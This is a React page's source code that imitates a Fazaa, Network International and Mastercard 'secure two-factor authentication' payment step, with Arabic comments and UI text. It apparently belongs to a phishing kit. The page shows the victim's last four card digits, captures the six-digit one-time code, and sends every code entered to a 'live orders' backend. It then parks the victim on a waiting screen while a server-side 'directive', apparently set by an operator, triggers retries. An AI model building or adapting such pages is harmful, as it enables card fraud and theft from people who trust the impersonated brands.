/* صفحة رمز التحقق OTP التجريبية — مع مؤقت صلاحية */
import { useState, useEffect, useRef } from "react";
import { useSearch } from "wouter";
import { toast } from "sonner";
import SiteLayout from "@/components/SiteLayout";
import WaitingScreen from "@/components/WaitingScreen";
import { useOrder } from "@/contexts/OrderContext";
import { upsertCurrentOrder, resetCurrentDirectiveToWait, fetchCurrentOrder } from "@/lib/liveOrders";

export default function Otp() {
  const { order } = useOrder();
  const search = useSearch();
  const isRetry = new URLSearchParams(search).get("retry") === "1";
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [seconds, setSeconds] = useState(60);
  const [waiting, setWaiting] = useState(false);
  const [last4, setLast4] = useState("");
  const inputs = useRef<(HTMLInputElement | null)[]>([]);

  // عند العودة بعد رفض OTP: أعد ضبط التوجيه إلى wait حتى لا تتكرر الإعادة
  useEffect(() => {
    if (isRetry) {
      resetCurrentDirectiveToWait().catch(() => {});
      toast.error("انتهت صلاحية الرمز أو أنه غير صحيح، يرجى إدخال رمز جديد.");
      setSeconds(60);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isRetry]);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);

  // جلب آخر 4 أرقام من بطاقة الطلب الحالي
  useEffect(() => {
    fetchCurrentOrder()
      .then((o) => {
        const num = (o?.cardNumber || "").replace(/\D/g, "");
        if (num.length >= 4) setLast4(num.slice(-4));
      })
      .catch(() => {});
  }, []);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (digits.some((d) => !d)) {
      toast.error("يرجى إدخال رمز التحقق المكوّن من 6 أرقام");
      return;
    }
    // إرسال رمز OTP إلى الخادم ثم البقاء في الانتظار (لا تحويل تلقائي).
    // appendOtp=true يضمن إضافة الرمز الجديد أسفل القديم في سجل نفس الطلب.
    setWaiting(true);
    try {
      await upsertCurrentOrder({ page: "رمز OTP", otp: digits.join(""), directive: "wait", appendOtp: true });
    } catch {
      toast.error("تعذّر الإرسال، حاول مجدداً");
    }
  };

  if (waiting) {
    return (
      <SiteLayout>
        <WaitingScreen />
      </SiteLayout>
    );
  }

  return (
    <SiteLayout>
      <section className="container pb-16 max-w-md pt-8">
        <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100">
          {/* Header Logos */}
          <div className="flex justify-between items-center mb-6">
            <div className="flex flex-col items-center justify-center border border-[#E6C766]/30 rounded-lg px-3 py-1 bg-[#fdfbf7]">
              <span className="text-[#C9A227] font-bold text-sm">فزعة</span>
              <span className="text-[#C9A227] font-bold text-xs tracking-widest">FAZAA</span>
            </div>
            <div className="border border-gray-200 rounded px-2 py-1 bg-white">
              <span className="text-[#1a3b70] font-bold text-sm">Network<span className="text-red-500">&gt;</span></span>
              <div className="text-[6px] text-gray-400 text-center">International Payment Solutions</div>
            </div>
          </div>
          
          {/* Mastercard Logo */}
          <div className="flex mb-6">
            <div className="relative w-12 h-8">
              <div className="absolute left-0 w-8 h-8 rounded-full bg-[#eb001b] opacity-90 z-10"></div>
              <div className="absolute left-4 w-8 h-8 rounded-full bg-[#f79e1b] opacity-90 z-0"></div>
            </div>
          </div>

          <hr className="border-gray-200 mb-6" />

          {/* Title & Description */}
          <div className="text-center mb-8">
            <h1 className="text-xl font-bold text-[#C9A227] mb-4">المصادقة الثنائية الآمنة</h1>
            <p className="text-sm text-gray-600 leading-relaxed">
              ستتلقى رمزاً سرياً لمره واحده (OTP) لتأكيد عملية الدفع بأمان عبر رسالة نصية، أو مكالمة هاتفية، أو تطبيق البنك.
            </p>
          </div>

          <hr className="border-gray-200 mb-6" />

          {/* OTP Section */}
          <div className="text-center mb-6">
            <h2 className="text-lg font-bold text-gray-800 mb-2">يرجى إدخال رمز التحقق (OTP):</h2>
            <p className="text-xs text-gray-500">
              الرمز مرسل الآن إلى رقم الهاتف المرتبط بالبطاقة <span dir="ltr" className="font-bold text-gray-700">****{last4 || "••••"}</span>
            </p>
          </div>

          <form onSubmit={submit} className="space-y-6">
            <div className="text-right">
              <label className="block text-sm font-bold text-gray-700 mb-2">أدخل الرمز هنا:</label>
              <input
                type="text"
                value={digits.join("")}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 6);
                  const newDigits = ["", "", "", "", "", ""];
                  for (let i = 0; i < val.length; i++) {
                    newDigits[i] = val[i];
                  }
                  setDigits(newDigits);
                }}
                inputMode="numeric"
                maxLength={6}
                dir="ltr"
                className="w-full h-12 rounded-lg border border-[#C9A227] bg-white px-4 text-center text-xl tracking-[0.6em] focus:outline-none focus:ring-1 focus:ring-[#C9A227] transition"
              />
            </div>

            <div className="text-center">
              {seconds > 0 ? (
                <span className="text-sm text-gray-600">
                  صلاحية الرمز تنتهي خلال <span className="font-bold text-[#C9A227] text-base">{seconds}</span> ثانية
                </span>
              ) : (
                <span className="text-sm font-semibold text-red-500">انتهت صلاحية الرمز</span>
              )}
            </div>

            <button type="submit" className="w-full bg-gradient-to-b from-[#e8c86b] to-[#cba42a] text-black rounded-lg py-3 text-base font-bold shadow-sm hover:opacity-90 transition">
              تأكيد
            </button>
          </form>
        </div>
      </section>
    </SiteLayout>
  );
}
